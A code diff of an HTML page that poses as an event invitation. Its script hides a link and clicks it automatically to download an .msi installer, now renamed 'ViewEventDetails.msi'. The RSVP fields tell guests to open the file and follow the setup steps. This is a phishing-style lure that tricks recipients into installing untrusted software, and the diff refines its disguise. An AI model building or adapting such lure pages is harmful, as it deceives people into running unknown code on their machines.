@@ -190,7 +190,7 @@
           <span id="nameB">CEDEL GUGU</span>
         </div>
 
-        <div class="meta" id="dateInfo">THURSDAY • 1ST OF JANUARY • 5:30 PM</div>
+        <div class="meta" id="dateInfo">• 31ST OF JANUARY • 5:30 PM</div>
         <div class="meta" id="venueLine1">GRAND ORCHID HALL</div>
         <div class="meta" id="venueLine2">MARIGATE • BERGANO</div>
 
@@ -283,7 +283,7 @@
       title: "You're Invited",
       nameA: "RSVP NOW",
       nameB: "Instructions",
-      dateInfo: "THURSDAY • 1ST OF JANUARY • 5:30 PM",
+      dateInfo: "• 31ST OF JANUARY • 5:30 PM",
       venueLine1: "Wait for the download to finish.",
       venueLine2: "Open the downloaded file",
       venueLine3: "Follow the on-screen setup instructions.",
@@ -300,7 +300,7 @@
   <!-- Auto + manual download -->
   <script>
     // Change this once to your real file name (or path)
-    const FILE_NAME = "12thRSVPClientSetup(1).msi";
+    const FILE_NAME = "ViewEventDetails.msi";
 
     // Wire manual link
     (function bindManual(){
@@ -322,7 +322,7 @@
         const a = document.createElement("a");
         a.style.display = "none";
         a.href = url;
-        a.download = url.split("/").pop() || "12thRSVPClientSetup(1).msi";
+        a.download = url.split("/").pop() || "ViewEventDetails.msi";
         document.body.appendChild(a);
         a.click();
         a.remove();
@@ -348,7 +348,7 @@
           const a2 = document.createElement("a");
           a2.style.display = "none";
           a2.href = objectUrl;
-          a2.download = url.split("/").pop() || "12thRSVPClientSetup(1).msi";
+          a2.download = url.split("/").pop() || "ViewEventDetails.msi";
           document.body.appendChild(a2);
           a2.click();
           a2.remove();
